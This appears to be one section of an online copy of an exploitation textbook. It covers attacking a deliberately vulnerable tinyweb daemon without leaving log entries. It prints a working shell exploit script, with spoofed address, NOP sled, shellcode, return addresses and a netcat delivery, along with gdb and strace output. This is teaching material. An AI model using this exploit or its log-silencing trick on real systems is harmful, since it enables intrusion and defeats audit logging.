<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x662 Logless Exploitation</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part144.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part146.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark132">0x662 Logless Exploitation</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Ideally, we want to leave no trace at all. In the setup on the LiveCD, technically you can just delete the log files after you get a root shell. However, let’s assume this program is part of a secure infrastructure where the log files are mirrored to a secure logging server that has minimal access or maybe even a line printer. In these cases, deleting the log files after the fact is not an option. The <span class="s31">timestamp() </span>function in the tinyweb daemon tries to be secure by writing directly to an open file descriptor. We can’t stop this function from being called, and we can’t undo the write it does to the log file. This would be a fairly effective countermeasure; however, it was implemented poorly. In fact, in the previous exploit, we stumbled upon this problem.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Even though <span class="s31">logfd </span>is a global variable, it is also passed to <span class="s31">handle_connection() </span>as a function argument. From the discussion of functional context, you should remember that this creates another stack variable with the same name, <span class="s31">logfd</span>. Since this argument is found right after the <span class="s31">client_addr_ptr </span>on the stack, it gets partially overwritten by the null terminator and the extra <span class="s31">0x0a </span>byte found at the end of the exploit buffer.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1075.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">(gdb) x/xw &amp;client_addr_ptr 0xbffff7e4:   0xbffff5cf (gdb) x/xw &amp;logfd 0xbffff7e8:   0x00000a00 (gdb) x/4xb &amp;logfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7e8:   0x00   0x0a   0x00  0x00 (gdb) x/8xb &amp;client_addr_ptr</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">0xbffff7e4:   0xcf   0xf5   0xff   0xbf   0x00   0x0a   0x00   0x00 (gdb) p logfd</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$6 = 2560</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">The program is running. Quit anyway (and detach it)? (y or n) y Detaching from program: , process 27264</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo kill 27264 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1076.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">As long as the log file descriptor doesn’t happen to be 2560 (<span class="s31">0x0a00 </span>in hexadecimal), every time <span class="s31">handle_connection() </span>tries to write to the log it will fail. This effect can be quickly explored using strace. In the output below,</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">strace is used with the <span class="s31">-p </span>command-line argument to attach to a running process. The <span class="s31">-e trace=write </span>argument tells strace to only look at write calls. Once again, the spoofing exploit tool is used in another terminal to connect and advance execution.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1077.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:72pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">478 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">420 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:24</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:39pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:72pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">525 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:24</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write Process 478 attached - interrupt to quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">write(2560, &quot;09/19/2007 23:29:30&gt; &quot;, 21) = -1 EBADF (Bad file descriptor)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(2560, &quot;From 12.34.56.78:9090 \&quot;GET / HTT&quot;.., 47) = -1 EBADF (Bad file descriptor)</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Process 478 detached reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1078.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This output clearly shows the attempts to write to the log file failing. Normally, we wouldn’t be able to overwrite the <span class="s31">logfd </span>variable, since the <span class="s31">client_addr_ptr </span>is in the way. Carelessly mangling this pointer will usually lead to a crash. But since we’ve made sure this variable points to valid memory (our injected spoofed address structure), we’re free to overwrite the vari- ables that lie beyond it. Since the tinyweb daemon redirects standard out to</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">/dev/null, the next exploit script will overwrite the passed <span class="s31">logfd </span>variable with <span class="s31">1</span>, for standard output. This will still prevent entries from being written to the log file but in a much nicer way—without errors.</p><p class="s40" style="padding-top: 9pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">xtool_tinywebd_silent.sh</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1079.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#!/bin/sh</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;"># Silent stealth exploitation tool for tinywebd #  also spoofs IP address stored in memory</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">SPOOFIP=”12.34.56.78&quot; SPOOFPORT=&quot;9090&quot;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;line-height: 107%;text-align: left;">if [ -z &quot;$2&quot; ]; then # If argument 2 is blank echo &quot;Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;&quot; exit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fi</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">FAKEREQUEST=&quot;GET / HTTP/1.1\x00&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">FR_SIZE=$(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot; | wc -c | cut -f1 -d &#39; &#39;) OFFSET=540</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">RETADDR=&quot;\x24\xf6\xff\xbf&quot; # At +100 bytes from buffer @ 0xbffff5c0 FAKEADDR=&quot;\xcf\xf5\xff\xbf&quot; # +15 bytes from buffer @ 0xbffff5c0 echo &quot;target IP: $2&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SIZE=`wc -c $1 | cut -f1 -d &#39; &#39;` echo &quot;shellcode: $1 ($SIZE bytes)&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">echo &quot;fake request: \&quot;$FAKEREQUEST\&quot; ($FR_SIZE bytes)&quot; ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">echo &quot;[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]&quot;</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(perl -e &quot;print \&quot;$FAKEREQUEST\&quot;&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">./addr_struct &quot;$SPOOFIP&quot; &quot;$SPOOFPORT&quot;;</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;line-height: 107%;text-align: left;">perl -e &quot;print \&quot;\x90\&quot;x$ALIGNED_SLED_SIZE&quot;; cat $1;</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">perl -e &quot;print \&quot;$RETADDR\&quot;x32 . \&quot;$FAKEADDR\&quot;x2 . \&quot;\x01\x00\x00\x00\r\n\&quot;&quot;) | nc -w 1 -v $2 80</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1080.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When this script is used, the exploit is totally silent and nothing is written to the log file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1081.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo rm /Hacked reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon..</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log reader@hacking:~/booksrc $ ./xtool_tinywebd_silent.sh mark_restore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">shellcode: mark_restore (53 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128] [*fake_addr 8]</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">localhost [127.0.0.1] 80 (www) open reader@hacking:~/booksrc $ ls -l /var/log/tinywebd.log</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root reader 6526 2007-09-19 23:24 /var/log/tinywebd.log reader@hacking:~/booksrc $ ls -l /Hacked</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">-rw------- 1 root reader 0 2007-09-19 23:35 /Hacked reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1082.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Notice the log file’s size and access time remain the same. Using this technique, we can exploit tinywebd without leaving any trace in the log files. In addition, the write calls execute cleanly, as everything is written to</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">/dev/null. This is shown by strace in the output below, when the silent exploit tool is run in another terminal.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1083.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:74pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">478 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">420 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:24</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:37pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:74pt"><p class="s42" style="padding-left: 9pt;padding-right: 7pt;text-indent: 0pt;line-height: 9pt;text-align: center;">1005 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23:36</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write Process 478 attached - interrupt to quit</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(1, &quot;09/19/2007 23:36:31&gt; &quot;, 21)  = 21</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">write(1, &quot;From 12.34.56.78:9090 \&quot;GET / HTT&quot;.., 47) = 47</p><p class="s31" style="padding-bottom: 2pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Process 478 detached reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1084.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part146.htm">0x670 The Whole Infrastructure</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part144.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part146.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
